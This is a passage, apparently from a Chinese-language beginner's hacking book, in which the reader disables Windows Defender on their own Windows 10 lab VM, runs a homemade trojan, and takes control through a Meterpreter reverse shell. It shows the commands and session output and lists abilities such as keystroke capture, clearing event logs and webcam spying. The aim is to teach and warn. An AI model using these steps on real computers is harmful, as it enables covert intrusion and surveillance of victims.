    4. 单击 **管理设置** 并将实时保护和云提供的保护的切换按钮滑动到 **关闭**。Windows 将再次询问是否允许此应用对你的设备进行更改。单击 **是的**。你的
    Windows 10 VM 现在和地球上四分之一的 PC 一样脆弱。


    5. 打开 Edge 网页浏览器并访问 `http://<10.0.9.x>/share/`。


    6. 单击你的木马并选择 **保存**，将文件下载到你的 Windows VM 的 `Downloads` 文件夹。


    7. 真相的时刻：打开 Windows VM 的 `Downloads` 文件夹并双击木马可执行文件以运行它。


    8. 原来 Windows 10 PC 还有一层病毒保护，可以防止我们刚刚犯的那种愚蠢错误：Windows Defender SmartScreen 会弹出警告，称它“阻止了一个未识别的应用启动”，如
    图 6-4 所示。单击 **详细信息** 然后 **仍要运行**。


    你现在已经控制了你的第一台计算机！你在 Windows VM 上看不到任何事情发生，但如果你切换回 Kali VM，你应该在 `msfconsole` 中看到类似以下内容：


    ```

    [*] Sending stage (179779 bytes) to 10.0.9.5

    [*] Meterpreter session 1 opened (10.0.9.4:4444 -> 10.0.9.5:49830) at 2021-06-11
    12:39:46 -0400

    ```


    受感染的 Windows VM 已回调到 Kali 并建立了连接（也称为 *session*）。恭喜：Windows VM 现在正在等待你的命令！


    ![图 6-4：Windows Defender SmartScreen 试图最后一次保护你的 Windows VM。](img/f06004a.png)


    图 6-4：Windows Defender SmartScreen 试图最后一次保护你的 Windows VM。


    ## 使用 Meterpreter 控制你的 Windows VM


    现在我们已经在你的 Kali 和 Windows VM 之间建立了连接，我们准备好从 Metasploit 开始操纵 Windows 机器了。首先，在 Metasploit
    终端窗口中输入 `sessions` 以查看活动 Metasploit 连接的列表：


    ```

    msf6 exploit(multi/handler) > sessions

    Active sessions

    =============== Id  Name  Type                     Information                       Connection
    --  ----  ----                     -----------                       ----------
    1         meterpreter x86/windows  MSEDGEWIN10\IEUser @ MSEDGEWIN10  10.0.9.4:4444
    -> 10.0.9.5:63750 (10.0.9.5)

    ```


    如你所见，我们已连接到名为 MSEdgeWin10 的受感染 Windows 10 机器，用户名为 *IEUser*——那就是你的 Windows 10 VM！我们的会话
    ID 号为 1。如果你也在其他机器上运行了木马，你会看到列出多个会话，每个会话都有自己的 ID 号。同样，如果你需要重新建立与 Windows VM 的连接，它将列出不同的
    ID 号，例如 2。


    输入 `sessions -i 1` 以开始与 Windows VM 交互：


    ```

    msf6 exploit(multi/handler) > sessions -i 1

    [*] Starting interaction with 1...

    meterpreter >

    ```


    命令提示符更改为 `meterpreter >` 以表明我们正在与远程 Windows VM 上的 Meterpreter shell 交互。让我们尝试几个命令。输入
    `sysinfo` 以查看有关计算机的一些信息，例如其操作系统（OS）、系统语言等：


    ```

    meterpreter > sysinfo

    Computer        : MSEDGEWIN10

    OS              : Windows 10 (Build 17763).--snip--

    ```


    现在让我们尝试另一个命令，`pwd`，缩写为 *打印工作目录*，以查看 Meterpreter shell 从哪里运行：


    ```

    meterpreter > pwd

    C:\Users\IEUser\Downloads

    ```


    这告诉我们 Meterpreter shell 正在从 Windows VM 的 `Downloads` 目录运行——我们的木马就位于那里。


    输入 `help` 以列出你可以在 Meterpreter shell 中远程在 Windows VM 上运行的一些最常见命令。有运行程序、终止正在运行的进程、关闭或重新启动远程计算机、清除事件日志（以便在黑客攻击时掩盖痕迹）、捕获击键、截屏以及监视远程用户桌面或网络摄像头的命令，仅举几例。总共，攻击者可以使用超过
    100 个命令来几乎完全控制一台计算机。这些命令的部分列表显示在 图 6-5。


    为了了解威胁的严重性到底如何，让我们看看攻击者通过感染文件有多容易入侵我们的文件、键盘、网络摄像头等。并非我们使用的每个命令每次尝试都会有效；你可能需要多次尝试。然而，探索这些命令造成的破坏应该能促使你
    *永远不要* 从随机网页或电子邮件附件安装软件。


    ![图 6-5：我们可以用来控制受感染 Windows VM 的一系列令人恐惧的酷 Meterpreter 命令](img/f06005a.png)


    图 6-5：我们可以用来控制受感染 Windows VM 的一系列令人恐惧的酷 Meterpreter 命令


